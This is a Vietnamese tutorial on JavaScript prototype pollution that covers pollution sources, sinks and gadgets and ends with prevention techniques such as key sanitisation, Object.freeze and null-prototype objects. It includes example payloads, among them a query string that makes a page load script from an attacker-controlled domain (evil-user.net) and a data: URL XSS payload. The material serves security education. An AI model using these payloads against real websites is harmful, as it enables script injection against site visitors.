## Prototype Pollution là gì?
Prototype Pollution là một lỗ hổng trong JavaScript, cho phép kẻ tấn công thêm các thuộc tính tùy ý vào các prototype của đối tượng toàn cục. Những thuộc tính này có thể được các đối tượng do người dùng định nghĩa kế thừa.

![alt text](image.png)

Dù prototype pollution thường không phải là một lỗ hổng có thể khai thác độc lập, nhưng nó cho phép kẻ tấn công kiểm soát các thuộc tính của đối tượng mà bình thường sẽ không thể truy cập được. Nếu ứng dụng xử lý các thuộc tính do kẻ tấn công kiểm soát theo cách không an toàn, lỗ hổng này có thể được kết hợp với các lỗ hổng khác.

- Trong JavaScript phía client, điều này thường dẫn đến DOM XSS.
- Trong JavaScript phía server, prototype pollution có thể dẫn đến remote code execution (RCE).

## Nguyên nhân lỗ hổng Prototype Pollution
Lỗ hổng này thường xuất hiện khi một hàm JavaScript thực hiện việc merge đệ quy (`recursive merge`) một đối tượng có chứa các thuộc tính do người dùng kiểm soát vào một đối tượng hiện có mà không kiểm tra hoặc lọc các key. Điều này cho phép kẻ tấn công chèn thuộc tính với key đặc biệt như `__proto__`, cùng với các thuộc tính lồng ghép tùy ý.

Vì `__proto__` có ý nghĩa đặc biệt trong JavaScript, thao tác merge này có thể gán các thuộc tính lồng ghép vào prototype của đối tượng thay vì chính đối tượng đó. Do đó, kẻ tấn công có thể "nhiễm độc" prototype bằng các thuộc tính chứa giá trị độc hại, dẫn đến việc ứng dụng sử dụng chúng theo cách nguy hiểm.

Lỗ hổng này có thể xảy ra với bất kỳ prototype nào, nhưng thường gặp nhất ở prototype toàn cục mặc định `Object.prototype`.

Khai thác **Prototype Pollution** cần những gì?
- Nguồn gây ô nhiễm (Source):
Đầu vào cho phép kẻ tấn công tiêm các thuộc tính tùy ý vào các prototype.

- Sink:
Hàm JavaScript hoặc DOM element nào đó có thể dẫn đến thực thi mã tùy ý.

- Gadget có thể khai thác:
Thuộc tính được truyền vào sink mà không được lọc hoặc kiểm tra hợp lệ.

## Prototype pollution sources
Prototype pollution sources là bất kỳ đầu vào nào mà người dùng có thể kiểm soát và cho phép thêm các thuộc tính tùy ý vào prototype của đối tượng. Các nguồn phổ biến bao gồm:

- URL thông qua query string hoặc fragment string (hash)
- Dữ liệu JSON
- Web messages

### Prototype Pollution qua URL
Xem xét URL sau, nơi query string được kẻ tấn công tạo:
```js
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Khi phân tích query string thành các cặp `key:value`, trình phân tích URL có thể coi `__proto__` như một chuỗi ký tự tùy ý. Tuy nhiên, nếu các key và value này được merge vào một đối tượng hiện có, kết quả có thể như sau:

```js
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```
Nhưng thực tế, phép gán đệ quy có thể thực hiện một câu lệnh như sau:
```js
targetObject.__proto__.evilProperty = 'payload';
```

Khi đó, JavaScript coi `__proto__` là getter cho prototype, khiến `evilProperty` được gán vào prototype của đối tượng thay vì chính đối tượng đó.

Nếu đối tượng mục tiêu sử dụng prototype mặc định `Object.prototype`, mọi đối tượng trong runtime JavaScript sẽ kế thừa thuộc tính `evilProperty`, trừ khi chúng đã có thuộc tính trùng key.

### Prototype Pollution qua JSON Input
Dữ liệu đầu vào do người dùng kiểm soát thường được tạo từ chuỗi JSON thông qua `JSON.parse()`, trong đó mọi key, kể cả `__proto__`, đều được xử lý như chuỗi ký tự tùy ý.

Ví dụ, kẻ tấn công có thể chèn JSON độc hại sau:
```js
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

Khi được chuyển thành đối tượng JavaScript qua `JSON.parse()`, kết quả sẽ có thuộc tính với key `__proto__`:
```js
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
objectFromJson.hasOwnProperty('__proto__'); // true
```

Nếu đối tượng được tạo qua `JSON.parse()` được merge vào một đối tượng hiện có mà không lọc key, sẽ xảy ra `prototype pollution`, giống như trường hợp với URL.

## Prototype Pollution Sinks
`Prototype pollution sink` là bất kỳ hàm JavaScript hoặc phần tử DOM nào mà bạn có thể truy cập thông qua prototype pollution, cho phép bạn thực thi JavaScript tùy ý hoặc lệnh hệ thống.

Chúng ta đã đề cập chi tiết về một số sink phía client trong chủ đề về DOM XSS.

Prototype pollution cho phép bạn kiểm soát các thuộc tính vốn không thể truy cập được, từ đó có khả năng khai thác nhiều sink bổ sung trong ứng dụng mục tiêu. Các nhà phát triển không quen thuộc với prototype pollution có thể cho rằng những thuộc tính này không thể bị người dùng kiểm soát, dẫn đến việc lọc và xử lý dữ liệu đầu vào không đầy đủ.


## Prototype Pollution Gadgets
Gadget là công cụ biến lỗ hổng prototype pollution thành một khai thác thực tế. Gadget là bất kỳ thuộc tính nào thỏa mãn:

- Được ứng dụng sử dụng một cách không an toàn, chẳng hạn truyền vào một sink mà không qua lọc hoặc kiểm tra.
- Có thể bị kẻ tấn công kiểm soát thông qua prototype pollution, tức là đối tượng phải có khả năng kế thừa phiên bản độc hại của thuộc tính được thêm vào prototype bởi kẻ tấn công.

Một thuộc tính không thể trở thành gadget nếu nó được định nghĩa trực tiếp trên đối tượng. Khi đó, phiên bản thuộc tính của đối tượng sẽ ưu tiên hơn phiên bản độc hại được thêm vào prototype. Các trang web bảo mật cao có thể thiết lập prototype của đối tượng là `null`, ngăn chặn việc kế thừa bất kỳ thuộc tính nào.

### Ví dụ về công cụ tấn công prototype pollution
Nhiều thư viện JavaScript chấp nhận một đối tượng mà nhà phát triển có thể sử dụng để thiết lập các tùy chọn cấu hình khác nhau. Mã thư viện kiểm tra xem nhà phát triển có thêm các thuộc tính cụ thể vào đối tượng này hay không, và nếu có, nó điều chỉnh cấu hình tương ứng. Nếu một thuộc tính đại diện cho một tùy chọn cụ thể không tồn tại, thư viện thường sử dụng tùy chọn mặc định được định nghĩa trước. Ví dụ đơn giản:
```js
let transport_url = config.transport_url || defaults.transport_url;
```

Bây giờ, giả sử mã thư viện sử dụng `transport_url` để thêm một tham chiếu script vào trang:
```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```
Nếu các nhà phát triển trang web không thiết lập thuộc tính `transport_url` trên đối tượng `config`, đây là một công cụ tiềm năng. Trong trường hợp kẻ tấn công có thể gây ô nhiễm `Object.prototype` toàn cục với thuộc tính `transport_url` của riêng họ, thuộc tính này sẽ được thừa kế bởi đối tượng `config` và được đặt làm giá trị `src` của script, trỏ đến một domain do kẻ tấn công kiểm soát.

Nếu prototype có thể bị ô nhiễm thông qua một tham số truy vấn, chẳng hạn, kẻ tấn công chỉ cần lừa nạn nhân truy cập vào một URL được chế tạo đặc biệt để trình duyệt của họ tải một file JavaScript độc hại từ domain của kẻ tấn công:

```js
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```
Bằng cách cung cấp một URL dạng `data:`, kẻ tấn công cũng có thể nhúng trực tiếp payload XSS vào chuỗi truy vấn như sau:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
Lưu ý rằng phần `//` ở cuối ví dụ trên chỉ dùng để comment suffix `/example.js` đã được mã hóa sẵn.

## HOW TO PREVENT

Chúng tôi khuyên bạn nên vá mọi lỗ hổng ô nhiễm nguyên mẫu mà bạn xác định được trên trang web của mình, bất kể chúng có đi kèm với các gadget dễ khai thác hay không. Ngay cả khi bạn tự tin rằng mình không bỏ sót bất kỳ lỗi nào, cũng không có gì đảm bảo rằng các bản cập nhật trong tương lai cho mã của bạn hoặc bất kỳ thư viện nào bạn sử dụng sẽ không giới thiệu các tiện ích mới, mở đường cho các cuộc khai thác khả thi.

### Sanitizing property keys

Một trong những cách rõ ràng nhất để ngăn chặn lỗ hổng ô nhiễm nguyên mẫu là `khử trùng khóa thuộc tính` trước khi hợp nhất chúng vào các đối tượng hiện có. Bằng cách này, bạn có thể ngăn chặn kẻ tấn công chèn các khóa như `__proto__`, tham chiếu đến nguyên mẫu của đối tượng.

Sử dụng whitelist các key được phép là cách hiệu quả nhất để thực hiện việc này. Tuy nhiên, vì điều này không khả thi trong nhiều trường hợp, nên người ta thường sử dụng blacklist thay thế, loại bỏ mọi chuỗi có khả năng gây nguy hiểm khỏi dữ liệu đầu vào của người dùng.

Mặc dù đây là giải pháp khắc phục nhanh chóng để triển khai, việc đưa vào blacklist thực sự mạnh mẽ vốn rất khó khăn, như đã chứng minh bởi các trang web chặn thành công `__proto__` nhưng lại không tính đến việc kẻ tấn công làm hỏng `prototype` của đối tượng thông qua `constructor` của đối tượng đó. Tương tự như vậy, các triển khai yếu cũng có thể được bỏ qua bằng các kỹ thuật che giấu đơn giản. Vì lý do này, chúng tôi chỉ khuyến nghị đây là giải pháp tạm thời chứ không phải là giải pháp lâu dài.

### Preventing changes to prototype objects

Một cách tiếp cận mạnh mẽ hơn để ngăn ngừa lỗ hổng ô nhiễm nguyên mẫu là ngăn chặn hoàn toàn việc thay đổi các đối tượng nguyên mẫu.

Gọi phương thức `Object.freeze()` trên một đối tượng sẽ đảm bảo rằng các thuộc tính và giá trị của đối tượng đó không thể bị sửa đổi nữa và không thể thêm bất kỳ thuộc tính mới nào. Vì bản thân prototype chỉ là các đối tượng nên bạn có thể sử dụng phương pháp này để chủ động loại bỏ mọi nguồn tiềm ẩn:
`Object.freeze(Object.prototype);`

Phương thức `Object.seal()` tương tự, nhưng vẫn cho phép thay đổi giá trị của các thuộc tính hiện có. Đây có thể là một giải pháp thỏa hiệp tốt nếu bạn không thể sử dụng `Object.freeze()` vì bất kỳ lý do gì.

### Preventing an object from inheriting properties

Trong khi bạn có thể sử dụng `Object.freeze()` để chặn các nguồn gây ô nhiễm nguyên mẫu tiềm ẩn, bạn cũng có thể thực hiện các biện pháp để loại bỏ các tiện ích. Theo cách này, ngay cả khi kẻ tấn công xác định được lỗ hổng ô nhiễm nguyên mẫu, thì khả năng khai thác được lỗ hổng này cũng rất thấp.

Theo mặc định, tất cả các đối tượng đều kế thừa từ `Object.prototype` toàn cục trực tiếp hoặc gián tiếp thông qua chuỗi nguyên mẫu. Tuy nhiên, bạn cũng có thể thiết lập thủ công nguyên mẫu của đối tượng bằng cách tạo nó bằng phương thức `Object.create()`. Điều này không chỉ cho phép bạn gán bất kỳ đối tượng nào bạn thích làm nguyên mẫu của đối tượng mới mà còn có thể tạo đối tượng với nguyên mẫu `null`, đảm bảo rằng đối tượng sẽ không kế thừa bất kỳ thuộc tính nào. 

```js
let myObject = Object.create(null);
Object.getPrototypeOf(myObject);    // null
```

### Using safer alternatives where possible

Một biện pháp phòng thủ mạnh mẽ khác chống lại ô nhiễm nguyên mẫu là sử dụng các đối tượng cung cấp khả năng bảo vệ tích hợp. Ví dụ, khi định nghĩa một đối tượng tùy chọn, bạn có thể sử dụng `Map` thay thế. Mặc dù `map` vẫn có thể kế thừa các thuộc tính độc hại, nhưng chúng có phương thức `get()` tích hợp chỉ trả về các thuộc tính được xác định trực tiếp trên chính `map`:

```js
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;                    // 'polluted'
options.get('evil');             // undefined
options.get('transport_url');    // 'https://normal-website.com'
```

`Set` là một giải pháp thay thế khác nếu bạn chỉ lưu trữ giá trị thay vì cặp `key:value`. Giống như `map`, `sets` cung cấp các phương thức tích hợp chỉ trả về các thuộc tính được xác định trực tiếp trên chính đối tượng:

```js
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;           // 'polluted';
option.has('evil');     // false
options.has('safe');    // true
```

